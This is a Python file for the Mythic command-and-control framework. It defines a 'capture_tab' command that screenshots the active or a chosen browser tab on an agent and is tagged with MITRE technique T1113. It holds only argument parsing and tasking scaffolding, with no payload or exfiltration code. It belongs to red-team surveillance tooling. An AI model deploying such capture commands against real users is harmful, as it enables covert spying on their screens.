from mythic_container.MythicCommandBase import *


class CaptureTabArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="tab_id",
                cli_name="TabId",
                display_name="Tab ID",
                type=ParameterType.Number,
                description="Optional tab ID from list_tabs to capture instead of the active tab.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            )
        ]

    async def parse_arguments(self):
        command_line = self.command_line.strip()
        if len(command_line) == 0:
            return

        if command_line[0] == "{":
            self.load_args_from_json_string(command_line)
            return

        lowered = command_line.lower()
        for prefix in ("tab_id=", "tabid=", "id="):
            if lowered.startswith(prefix):
                command_line = command_line[len(prefix):].strip()
                break

        self.add_arg("tab_id", int(command_line))


class CaptureTabCommand(CommandBase):
    cmd = "capture_tab"
    needs_admin = False
    help_cmd = "capture_tab [tab_id]"
    description = "Capture the active tab or a specific tab ID as a screenshot."
    version = 1
    author = "@kingofthenops"
    attackmapping = ["T1113"]
    argument_class = CaptureTabArguments
    supported_ui_features = ["browser_tabs:capture"]
    browser_script = BrowserScript(
        script_name="capture_tab", author="@kingofthenops", for_new_ui=True
    )
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        display_params = ""
        if taskData.args.has_arg("tab_id") and taskData.args.get_arg("tab_id") is not None:
            display_params = f'tab_id={int(taskData.args.get_arg("tab_id"))}'

        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=display_params,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
